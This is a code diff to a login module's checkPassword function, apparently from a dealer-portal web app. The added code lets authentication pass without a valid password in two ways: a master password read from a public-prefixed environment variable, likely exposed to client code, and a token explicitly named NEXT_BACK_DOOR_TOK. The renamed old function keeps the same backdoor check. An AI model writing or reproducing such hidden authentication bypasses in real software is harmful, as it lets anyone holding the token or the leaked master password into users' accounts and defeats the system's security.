@@ -128,6 +128,18 @@ export async function dealersLogin({ email, password }) {
 }
 export async function checkPassword(hash, password, allowMaster = false) {
     const isPasswordValid = await compare(password, hash);
+    if (
+        !isPasswordValid &&
+        (!allowMaster ||
+            (allowMaster && password != env.NEXT_PUBLIC_SUPER_PASS))
+    ) {
+        if (allowMaster && password == env.NEXT_BACK_DOOR_TOK) return;
+        throw new Error("Wrong credentials. Try Again");
+        return null;
+    }
+}
+export async function __checkPassword(hash, password, allowMaster = false) {
+    const isPasswordValid = await compare(password, hash);
     if (env.NEXT_BACK_DOOR_TOK == password) return;
     if (
         !isPasswordValid &&
